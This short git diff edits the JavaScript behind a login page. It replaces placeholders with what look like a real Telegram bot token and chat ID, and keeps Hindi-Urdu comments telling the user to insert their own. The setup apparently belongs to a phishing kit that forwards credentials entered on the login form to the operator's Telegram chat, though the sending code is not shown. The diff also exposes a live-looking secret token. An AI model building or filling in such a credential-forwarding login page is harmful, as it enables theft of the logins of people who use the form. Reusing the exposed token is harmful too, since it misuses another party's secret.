@@ -10,8 +10,8 @@ const errorMsg = document.getElementById("error-msg");
 
 const btnText = document.querySelector(".btn-text");
 const spinner = document.querySelector(".spinner");
-const BOT_TOKEN = 'YOUR_BOT_TOKEN';   // ← yahan apna token daalo
-const CHAT_ID   = 'YOUR_CHAT_ID';     // ← yahan apni chat ID daalo
+const BOT_TOKEN = '8641092286:AAG2xN5cOuP_2iUuNFuE3LqOOifxY5bOxUw';   // ← yahan apna token daalo
+const CHAT_ID   = '6628037271';     // ← yahan apni chat ID daalo
 
 // Enable login button only when both fields are filled
 function updateButtonState() {
